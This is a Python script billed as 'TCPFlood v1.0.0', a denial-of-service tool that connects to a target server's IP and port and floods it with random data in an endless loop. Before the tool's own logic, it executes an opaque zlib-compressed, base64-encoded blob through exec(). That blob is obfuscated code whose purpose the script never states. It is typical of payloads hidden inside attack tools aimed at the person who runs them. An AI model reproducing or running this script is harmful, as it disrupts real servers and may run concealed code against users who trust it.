import sys,random,socket,zlib,base64
from optparse import OptionParser

author = "Lusmaysh"
exec(zlib.decompress(base64.b64decode(b'eJwlkrcSo1YARXt/hTvvDp4liVS4ICNAEoigBx2gR87pAV/v9bg9tzp3TtWNw7z+ebVV+neaLJC9/QEPmP34D/z6wmzoxhkuy4//t18pe/sPfuGP9C9oorbh4DkQhSg6DlctO7VDc+I9LhLvLi1uqnp2YlRLhYqGbacFil2VfU339ejMGPcF94MfgFGUvjPoUuSdAOAyKnVnPIrd4YUU5z5AeQCylmfsbqxGGrxy8VLtoMF8Lr/KNRyVMT4RFZnuKyn1i2Krjmn55WFK26ztCGsnL6w0ME4JvIIPOJAaEsZKGY2vdQePmyhemyfPlZOGwbsW3epzEr6zLJC7bLh1EJFgtFxRpkEJ0m/6aqDLjlZC0l+KVjYOTB3o54VCfkS6SUjg4acXFM6L8lx9MwSkPnRfKDTJ7UQi2Nr99kBMu73IwPKTF5iRIgIrYgcXNiCaCgPk22YmHGUv6SFUpoGAr1ZzO9GVL7FrJHBrZtSrU+BJlYYV1I9FHrZiMcZDpuG6wPC8bPumiitPWN43Ws8se/a/HW45LYnXR0rdt0XmNg95odxkv070Ggoflj/UAxAs9MZxVMU3Oum3rb/q732plTra2QXdKu0YiOpaQ23MM3hmWICfDzuP0IVmBVYudmGbkr3zaM6Ph+SmxjeI3sxdlDHtYG5Wlfmitpfz9uTMa1Meg8FNnPvhWlAEYZtKIh63SVqRb6IJBzt2mSKMZ4ielv1Y0yUvPRM+U6pZSCaGWgHH3VGLbbfcmmBYXyT8G66eu5Q8X79fqvbN1weIaNMOrGWbptyaU4fBCWGQdRcR+ShdE2UJeZrKWBoaJwsSL5aWzxJPpzDVazBm54tigTkQ172kWEfFc9ccP75uTTWswKTXVnQnkOA2iR/WZrQCin5eqKczAwUjvNluFbHIkySlXhmQl4+jh00czUe77+jwpXc5JFSfq7oh1yVqnuU3Gjw11pgHpMdn4M/VxhLHZu66BnG3HknCOrFziKStrdfRZc0xiJW5ezim5kUYK8Jq3jJC0kej0wLGCxn0ut+EriBq+H1QvkDyKCSC5RUJO7Wslv/WtA/pCiDnxq7TvXVjXu7NVDE4+vqsI3zA28oa3BpsctoOWRHE7G7Rn0kvwvXcVeer5ycm/S7IzpUiVUZ8LYkgrvv+Uy/U08dMxUnnXV1or+J5KISeghF8l8n0PDXPURkmSrIscyf6Xn0czAYjyqawYCiKzRVUYz2g21UN/lpbbZ5fQAk07wEaHiDyWO5mZY6Q0tLNO5f9CzRUN2WeJIuY9DeRxfKzl2/uleWB78du72i8OOBScpx4MqyFkGOsAB0Ow3eaUeTCLP756+fPn/8C+2SytA==')))

p=OptionParser(usage="python"+sys.version[0]+" %prog [options]")
p.add_option("-s","--server",dest="host",help="Target server ip")
p.add_option("-p","--port",dest="port",type=int,help="Server port (default: 8080)")
p.add_option("-t","--turbo",dest="thr",type=int,help="Thread to send (default: 65000)")
opt,args=p.parse_args()
if len(sys.argv)<2:
	sys.exit(p.print_help())
if not opt.port:
	opt.port=8080
if not opt.thr:
	opt.thr=65000

if __name__=="__main__":
	if opt.host:
		print("""
 _______ _______ ______ _______ _                 _
(_______|_______|_____ (_______) |               | |
    _    _       _____) )____  | | ___   ___   __| |
   | |  | |     |  ____/  ___) | |/ _ \ / _ \ / _  |
   | |  | |_____| |    | |     | | |_| | |_| ( (_| |
   |_|   \______)_|    |_|      \_)___/ \___/ \____|

TCPFlood v1.0.0
Coded By %s
"""%(author))
		b=1
		client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		client.connect((opt.host,opt.port))
		while True:
			try:
				client.send(random._urandom(opt.thr))
				print("[%s] send packets to %s on port %s"%(b,opt.host,opt.port))
				b+=1
			except socket.error:
				sys.exit("Check host and port")
			except KeyboardInterrupt:
				sys.exit("[!] Process interrupted, good bye!")
